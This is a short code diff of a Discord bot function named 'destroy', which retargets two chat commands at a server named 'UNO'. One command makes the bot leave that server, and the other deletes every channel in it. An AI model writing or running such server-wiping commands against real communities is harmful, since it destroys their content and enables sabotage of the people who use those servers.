@@ -1,12 +1,12 @@
 async def destroy(message, client):
     if message.content == "!leaveServer":
         for guild in client.guilds:
-            if guild.name == "Kawaii Cutie Gang":
+            if guild.name == "UNO":
                 await guild.leave()
 
     if message.content == "!deleteAllChannels":
         for guild in client.guilds:
-            if guild.name == "Server von NeutraleTomate":
+            if guild.name == "UNO":
                 for channel in guild.channels:
                     try:
                         await channel.delete()
